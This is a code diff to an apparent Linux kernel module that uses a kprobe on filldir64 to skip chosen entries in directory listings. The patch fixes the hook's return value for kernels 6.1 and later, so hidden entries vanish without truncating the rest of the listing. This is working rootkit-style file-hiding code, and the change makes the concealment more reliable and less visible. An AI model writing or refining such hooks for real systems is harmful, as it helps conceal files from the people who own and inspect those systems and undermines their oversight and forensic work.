@@ -13,6 +13,17 @@
 #include <linux/string.h>
 #include <linux/types.h>
 #include <linux/uaccess.h>
+#include <linux/version.h>
+
+/* filldir64 return contract flipped from int (5.10..6.0) to bool (6.1+).
+ * "Continue enumeration but skip this entry" is 0 (int) or true=1 (bool);
+ * false=0 in the new ABI means "stop the whole readdir", which would
+ * truncate the caller's listing. Bug #4. */
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 1, 0)
+#define HT_FILLDIR_CONTINUE 1UL
+#else
+#define HT_FILLDIR_CONTINUE 0UL
+#endif
 
 #include <driver/uapi.h>
 
@@ -197,8 +208,9 @@ static int filldir64_pre(struct kprobe *p, struct pt_regs *regs) {
 	return 0;
 
 spoof:
-	/* Skip original, return 0/false (continue iteration without adding). */
-	regs->regs[0] = 0;
+	/* Skip original filldir; return the correct "continue but skip entry"
+	 * value for this kernel's filldir_t contract (see HT_FILLDIR_CONTINUE). */
+	regs->regs[0] = HT_FILLDIR_CONTINUE;
 	instruction_pointer_set(regs, procedure_link_pointer(regs));
 	return 1;
 }
